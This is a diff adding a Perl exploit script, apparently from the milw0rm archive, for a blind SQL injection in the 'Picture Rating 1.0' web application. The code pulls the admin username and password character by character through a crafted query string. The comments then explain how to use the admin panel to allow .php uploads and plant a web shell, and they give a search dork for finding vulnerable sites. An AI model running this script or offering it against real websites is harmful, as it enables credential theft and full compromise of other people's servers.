@@ -1,0 +1,72 @@
+#!/usr/bin/perl
+
+# -- Picture Rating 1.0 Blind SQL Injection Exploit --
+
+# -Info/Instructions-
+# After running this perl script, you will have admin details therefore you will be able to login to the admin area at http://site.com/control/
+# ok once you have logged in has admin you can upload a shell, click "edit settings" and under the allowed extensions, add ".php" ok now
+# register as a normal user or backup the database and get a existing users and login to the main site and navigate to upload image/photo and choose your shell and click upload
+# the shell should successfully upload and now you will see a broken image, right click the broken image icon and get the link, navigate to this link in your browser and thats your shell ;)
+
+
+# Vendor Not Notified
+# Discovered By: t0pP8uZz
+# Discovered On: 6 April 2008
+# greetz: milw0rm.com, h4ck-y0u.org, ciphercrew!
+
+# inurl:"index.php?cmd=" Latest Pictures hot 
+
+# -- Picture Rating 1.0 Blind SQL Injection Exploit --
+
+use strict;
+use LWP::Simple;
+
+print "---------- Picture Rating 1.0 Blind SQL Injection Exploit ----------\n";
+print "-  Discovered && Coded By: t0pP8uZz                                -\n";
+print "-                                  Discovered On: 6 April 2008     -\n";
+print "-                                                                  -\n";
+print "-   This exploit will perform a automated BLIND SQL attack on ..   -\n";
+print "-   .. the target host which is running the script.                -\n";
+print "--------------------------------------------------------------------\n";
+
+print "\nEnter URL (ie: http://site.com/): ";
+	chomp(my $url=<STDIN>);
+	
+if(inject_test($url)) {
+	print "Injecting.. Please Wait this could take several minutes..\n\n";
+	my $details = blind($url);
+	print "Exploit Success! Admin Details: ".$details;
+	exit;
+}
+
+sub blind {
+
+	my $url    = shift;
+	my $res    = undef;
+	my $chr    = 48;
+	my $substr = 1;
+	my $done   = 1;
+	
+	while($done) {
+		my $content = get($url."/index.php?cmd=11&listpics=Y&age1=13&age2=99 and ascii(substring((SELECT CONCAT(username,0x3a,password,0x5E) FROM admin),".$substr.",1))=".$chr."/*");
+		
+		if($content =~ /Previous/ && $chr == 94) { $done = 0; }
+			elsif($content =~ /Previous/) { $res .= chr($chr); $substr++; $chr = 48; }
+				else { $chr++; }
+	}
+	return $res;
+}
+
+sub inject_test {
+
+	my $url     = shift;
+	my $true    = get($url."/index.php?cmd=11&listpics=Y&age1=13&age2=99 and 1=1");
+	my $false   = get($url."/index.php?cmd=11&listpics=Y&age1=13&age2=99 and 1=2");
+	
+	if($true =~ /Previous/ && $false !~ /Previous/) {
+		print "\nTarget Site Vulnerable!\n\n";
+		return 1;
+	} else { print "\nTarget Site Not Vulnerable! Exiting.."; exit; }
+}
+
+# milw0rm.com [2008-04-05]
